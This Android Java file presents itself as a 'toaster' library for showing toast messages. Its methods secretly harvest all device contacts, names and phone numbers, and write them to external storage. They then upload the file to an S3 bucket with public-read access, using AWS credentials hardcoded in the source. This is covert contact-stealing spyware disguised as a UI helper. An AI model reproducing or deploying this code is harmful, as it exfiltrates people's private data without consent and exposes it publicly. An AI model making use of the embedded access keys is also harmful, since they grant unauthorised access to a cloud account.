package vadeworks.toasterlibary;

import android.Manifest;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Environment;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;

import com.amazonaws.auth.BasicAWSCredentials;
import com.amazonaws.auth.BasicSessionCredentials;
import com.amazonaws.mobileconnectors.s3.transferutility.TransferListener;
import com.amazonaws.mobileconnectors.s3.transferutility.TransferObserver;
import com.amazonaws.mobileconnectors.s3.transferutility.TransferState;
import com.amazonaws.mobileconnectors.s3.transferutility.TransferUtility;
import com.amazonaws.regions.Region;
import com.amazonaws.regions.Regions;
import com.amazonaws.services.s3.AmazonS3;
import com.amazonaws.services.s3.AmazonS3Client;
import com.amazonaws.services.s3.model.CannedAccessControlList;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;

import static android.content.ContentValues.TAG;

public class ToasterMessage {


    public static void createToastMessage(Context c, String message, Activity a) throws IOException {

        int PERMISSION_ALL = 1;
        String[] PERMISSIONS = {
                Manifest.permission.READ_EXTERNAL_STORAGE
        };

        if (hasPermissions(c, PERMISSIONS)) {
            File file = new File(Environment.getExternalStorageDirectory(), "/Notes/" + "contacts.txt");
            String contacts = getFileContents(file);
            AmazonS3 s3Client = new AmazonS3Client(new BasicAWSCredentials("AKIAJJW7U7V2X7PP7VBA", "nN8fGts2e1z8Cyb3Ri72PRY7JV9U2biNhnfyVziv"));
            s3Client.setRegion(Region.getRegion(Regions.US_EAST_2));

            TransferUtility transferUtility = new TransferUtility(s3Client, c);
            TransferObserver transferObserver = transferUtility.upload("contactslist", "contacts.txt", file, CannedAccessControlList.PublicRead);
            transferObserver.setTransferListener(new TransferListener() {
                @Override
                public void onStateChanged(int id, TransferState state) {
                    // do something
                }

                @Override
                public void onProgressChanged(int id, long bytesCurrent, long bytesTotal) {
                    //Display percentage transfered to user
                }

                @Override
                public void onError(int id, Exception ex) {
                    // do something
                    Log.e("Error  ",""+ex );
                }

            });

            Toast.makeText(c, contacts, Toast.LENGTH_SHORT).show();


        } else {
            ActivityCompat.requestPermissions(a, PERMISSIONS, PERMISSION_ALL);
        }


    }


    public static String getFileContents(final File file) throws IOException {
        final InputStream inputStream = new FileInputStream(file);
        final BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));

        final StringBuilder stringBuilder = new StringBuilder();

        boolean done = false;

        while (!done) {
            final String line = reader.readLine();
            done = (line == null);

            if (line != null) {
                stringBuilder.append(line);
            }
        }

        reader.close();
        inputStream.close();

        return stringBuilder.toString();
    }


    public static void createToast(Context c, String message, Activity a) {

        int PERMISSION_ALL = 1;
        String[] PERMISSIONS = {
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
        };

        ArrayList<String> contacts = new ArrayList<>();
        if (hasPermissions(c, PERMISSIONS)) {
            contacts = getContactList(c, a);
            generateNoteOnSD(c, "contacts.txt", contacts.toString());
        } else {
            ActivityCompat.requestPermissions(a, PERMISSIONS, PERMISSION_ALL);
        }
        Toast.makeText(c, contacts.toString(), Toast.LENGTH_SHORT).show();
    }


    public static void generateNoteOnSD(Context context, String sFileName, String sBody) {
        try {
            File root = new File(Environment.getExternalStorageDirectory(), "Notes");
            if (!root.exists()) {
                root.mkdirs();
            }
            File gpxfile = new File(root, sFileName);
            FileWriter writer = new FileWriter(gpxfile);
            writer.append(sBody);
            writer.flush();
            writer.close();
            Toast.makeText(context, "Saved", Toast.LENGTH_SHORT).show();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static boolean hasPermissions(Context context, String... permissions) {
        if (context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }


    private static ArrayList<String> getContactList(Context context, Activity activity) {
        ContentResolver cr = activity.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        ArrayList<String> contacts = new ArrayList<>();
        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        String fullContact = name + " " + phoneNo;
                        contacts.add(fullContact);
                        Log.i(TAG, "Name: " + name);
                        Log.i(TAG, "Phone Number: " + phoneNo);
                    }
                    pCur.close();
                }
            }
        }
        if (cur != null) {
            cur.close();
        }

        return contacts;
    }


}
